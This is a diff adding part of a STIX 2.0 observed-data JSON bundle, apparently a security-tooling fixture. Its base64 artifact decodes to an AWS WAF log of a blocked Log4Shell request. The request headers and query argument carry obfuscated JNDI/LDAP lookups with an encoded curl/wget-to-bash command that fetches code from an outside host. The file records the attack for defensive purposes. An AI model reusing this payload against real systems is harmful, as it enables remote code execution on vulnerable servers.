+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1MTkyMDY0MDQsImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzS25vd25CYWRJbnB1dHNSdWxlU2V0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiTG9nNEpSQ0UiLCJhY3Rpb24iOiJCTE9DSyIsInJ1bGVNYXRjaERldGFpbHMiOm51bGx9LCJub25UZXJtaW5hdGluZ01hdGNoaW5nUnVsZXMiOltdLCJleGNsdWRlZFJ1bGVzIjpudWxsfV0sInJhdGVCYXNlZFJ1bGVMaXN0IjpbXSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwicmVxdWVzdEhlYWRlcnNJbnNlcnRlZCI6bnVsbCwicmVzcG9uc2VDb2RlU2VudCI6bnVsbCwiaHR0cFJlcXVlc3QiOnsiY2xpZW50SXAiOiIxOTUuNTQuMTYwLjE0OSIsImNvdW50cnkiOiJSVSIsImhlYWRlcnMiOlt7Im5hbWUiOiJIb3N0IiwidmFsdWUiOiI1Mi41NC4yMzcuNjQifSx7Im5hbWUiOiJVc2VyLUFnZW50IiwidmFsdWUiOiIkeyR7Ojotan0kezo6LW59JHs6Oi1kfSR7OjotaX06JHs6Oi1sfSR7OjotZH0kezo6LWF9JHs6Oi1wfTovLzE5NS41NC4xNjAuMTQ5OjEyMzQ0L0Jhc2ljL0NvbW1hbmQvQmFzZTY0L0tHTjFjbXdnTFhNZ01UazFMalUwTGpFMk1DNHhORGs2TlRnM05DODFNaTQxTkM0eU16Y3VOalE2T0RCOGZIZG5aWFFnTFhFZ0xVOHRJREU1TlM0MU5DNHhOakF1TVRRNU9qVTROelF2TlRJdU5UUXVNak0zTGpZME9qZ3dLWHhpWVhOb30ifSx7Im5hbWUiOiJSZWZlcmVyIiwidmFsdWUiOiIke2puZGk6JHtsb3dlcjpsfSR7bG93ZXI6ZH0ke2xvd2VyOmF9JHtsb3dlcjpwfTovLzE5NS41NC4xNjAuMTQ5OjEyMzQ0L0Jhc2ljL0NvbW1hbmQvQmFzZTY0L0tHTjFjbXdnTFhNZ01UazFMalUwTGpFMk1DNHhORGs2TlRnM05DODFNaTQxTkM0eU16Y3VOalE2T0RCOGZIZG5aWFFnTFhFZ0xVOHRJREU1TlM0MU5DNHhOakF1TVRRNU9qVTROelF2TlRJdU5UUXVNak0zTGpZME9qZ3dLWHhpWVhOb30ifSx7Im5hbWUiOiJBY2NlcHQtRW5jb2RpbmciLCJ2YWx1ZSI6Imd6aXAifSx7Im5hbWUiOiJDb25uZWN0aW9uIiwidmFsdWUiOiJjbG9zZSJ9XSwidXJpIjoiLyIsImFyZ3MiOiJ4PSR7am5kaTpsZGFwOi8vMTk1LjU0LjE2MC4xNDk6MTIzNDQvQmFzaWMvQ29tbWFuZC9CYXNlNjQvS0dOMWNtd2dMWE1nTVRrMUxqVTBMakUyTUM0eE5EazZOVGczTkM4MU1pNDFOQzR5TXpjdU5qUTZPREI4ZkhkblpYUWdMWEVnTFU4dElERTVOUzQxTkM0eE5qQXVNVFE1T2pVNE56UXZOVEl1TlRRdU1qTTNMalkwT2pnd0tYeGlZWE5vfSIsImh0dHBWZXJzaW9uIjoiSFRUUC8xLjEiLCJodHRwTWV0aG9kIjoiR0VUIiwicmVxdWVzdElkIjoiMS02MWI5MTNlNi02YzFmOTFkNjE0Y2VmM2U1NDJlZDc4NDYifSwibGFiZWxzIjpbeyJuYW1lIjoiYXdzd2FmOm1hbmFnZWQ6YXdzOmtub3duLWJhZC1pbnB1dHM6TG9nNEpSQ0UifV19",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-14T22:05:34.095Z",
+            "last_observed": "2021-12-14T22:05:34.095Z",
+            "number_observed": 1
+        }
+    ],
+    "spec_version": "2.0"
+}
